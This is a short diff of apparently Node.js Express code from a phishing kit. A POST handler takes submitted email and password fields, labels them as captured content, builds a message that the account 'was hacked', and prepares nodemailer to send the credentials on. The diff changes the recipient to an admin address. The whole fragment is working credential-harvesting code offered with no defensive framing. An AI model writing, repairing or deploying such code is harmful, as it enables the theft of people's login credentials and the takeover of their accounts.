@@ -36,9 +36,10 @@ app.post('/_', function (req, res) {
    // res.render('f_success');
     var captured_content = `\n Email: ${req.body.email} Password: ${req.body.password}`;
     let toMail = req.body.owner;
-    console.log("es");
+    
+    console.log("es"+toMail);
     var message = "If the input value has correct then id was hacked "+captured_content;
-    var toEmail = link_owner.toMail;
+    var toEmail = link_owner.admin;
     console.log("ok"+toEmail);
 
     var transporter = nodemailer.createTransport({
